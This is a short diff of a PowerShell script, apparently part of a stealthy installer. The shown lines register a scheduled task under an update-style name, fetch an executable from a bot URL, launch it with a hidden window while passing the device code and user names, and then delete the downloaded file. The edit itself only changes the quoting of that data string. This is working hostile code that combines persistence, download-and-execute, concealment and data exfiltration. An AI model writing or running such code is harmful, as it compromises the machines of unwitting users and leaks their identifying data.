@@ -106,7 +106,7 @@ if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
 Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
 Start-ScheduledTask -TaskName $updateserv
 #DataUpload
-$combineddata = "Initial Install Ping || Device Code: **$code** // $userNames" 
+$combineddata = """Initial Install Ping || Device Code: **$code** // $userNames"""
 Invoke-WebRequest -Uri $messageboturl -OutFile $exePath -UseBasicParsing
 Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $combineddata
 Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
